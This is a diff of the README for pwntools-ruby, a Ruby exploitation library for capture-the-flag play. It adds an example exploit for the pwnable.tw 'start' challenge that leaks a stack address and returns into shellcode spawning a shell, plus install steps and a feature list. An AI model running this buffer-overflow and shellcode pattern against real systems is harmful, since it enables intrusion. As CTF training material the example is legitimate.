@@ -12,12 +12,12 @@ Always sad when playing CTF that there's nothing equivalent to pwntools in Pytho
 While pwntools is awesome, I always love Ruby far more than Python...
 So this is an attempt to create such library.
 
-There's almost NOTHING here now.
-(Edit: there's something here now, but not much :wink:)
-Going to implement important things (socket, tubes, asm/disasm, pack/unpack utilities) first.
 Would try to have consistent naming with original pwntools, and do things in Ruby style.
 
 # Example Usage
+
+Here's an exploitation for `start` which is a challenge on [pwnable.tw](https://pwnable.tw).
+
 ```ruby
 # encoding: ASCII-8BIT
 # The encoding line is important most time, or you'll get "\u0000" when using "\x00" in code,
@@ -25,14 +25,93 @@ Would try to have consistent naming with original pwntools, and do things in Rub
 
 require 'pwn'
 
-p pack(0x41424344)  # 'DCBA'
-context.endian = 'big'
-p pack(0x41424344)  # 'ABCD'
+context.arch = 'i386'
+context.log_level = :debug
+z = Sock.new 'chall.pwnable.tw', 10000
 
-context.local(bits: 16) do
-  p pack(0x4142)  # 'AB'
-end
+z.recvuntil "Let's start the CTF:"
+z.send p32(0x8048087).rjust(0x18, 'A')
+stk = u32(z.recvuntil "\xff")
+log.info "stack address: #{stk.hex}" # Log stack address
+
+# Return to shellcode
+addr = stk + 0x14
+payload = addr.p32.rjust(0x18, 'A') + asm(shellcraft.sh)
+z.write payload
+
+# Switch to interactive mode
+z.interact
 ```
+
+More features and details can be found in the
+[documentation](http://www.rubydoc.info/github/peter50216/pwntools-ruby/master/frames).
+
+# Installation
+
+Since there are two gems, which `pwntools-ruby` depends on, didn't be published to rubygems,
+you should install them by self. :disappointed:
+
+```sh
+gem install pwntools
+
+git clone https://github.com/bnagy/crabstone.git /tmp/crabstone
+cd /tmp/crabstone
+gem build crabstone.gemspec
+gem install crabstone
+
+git clone https://github.com/sashs/ruby-keystone.git /tmp/ruby-keystone
+cd /tmp/ruby-keystone/keystone_gem
+gem build keystone.gemspec
+gem install keystone
+```
+
+Some of the features (assembling/disassembling) require non-Ruby dependencies. Checkout the
+installation guide for
+[keystone-engine](https://github.com/keystone-engine/keystone/tree/master/docs) and
+[capstone-engine](http://www.capstone-engine.org/documentation.html).
+
+Or you are able to get running quickly with
+
+```sh
+# Install Capstone
+sudo apt-get install libcapstone3
+
+# Compile and install Keystone from source
+sudo apt-get install cmake
+git clone https://github.com/keystone-engine/keystone.git /tmp/keystone
+cd /tmp/keystone
+mkdir build
+cd build
+../make-share.sh
+sudo make install
+```
+
+# Supported Features
+
+## Architectures
+
+- [x] i386
+- [x] amd64
+- [ ] arm
+- [ ] thumb
+
+## Modules
+
+- [x] context
+- [x] asm
+- [x] disasm
+- [x] shellcraft
+- [x] elf
+- [x] dynelf
+- [x] logger
+- [ ] tube
+  - [x] sock
+  - [ ] process
+- [ ] fmtstr
+- [x] util
+  - [x] pack
+  - [x] cyclic
+  - [x] fiddling
 
 # Development
 ```sh
